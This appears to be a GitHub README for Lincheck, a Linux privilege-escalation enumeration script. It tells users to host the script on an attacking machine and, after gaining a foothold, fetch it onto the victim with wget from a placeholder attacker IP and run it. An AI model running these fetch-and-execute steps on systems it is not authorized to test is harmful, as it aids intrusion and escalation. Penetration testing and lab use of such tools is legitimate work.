# Lincheck
This is a linux privilege escalation checker tool that checks for common linux privilege escilation techniques.

Once you have get a initial foothold on a target machine than you can transfer this linux script on to the victim machine with python http server.

<h2>In Your Attacking Machine</h2> 

<code>git clone https://github.com/Vivek170952/Lincheck.git </code></br>

<code>cd Lincheck </code></br>

<code>python -m http.server 4444 </code></br>

<h2>In Your Victim Machine</h2>

<code>wget http://YOUR-IP:4444/linprivcheck.sh  </code></br>

<code>chmod +x linprivcheck.sh </code></br>

<code>./linprivcheck.sh</code></br>

This tool will save your lots of time inenumeration of machine and gives result in a good format.


https://user-images.githubusercontent.com/87767132/233546141-82fea8cb-db3a-4540-98c8-cb48c29588e5.mp4

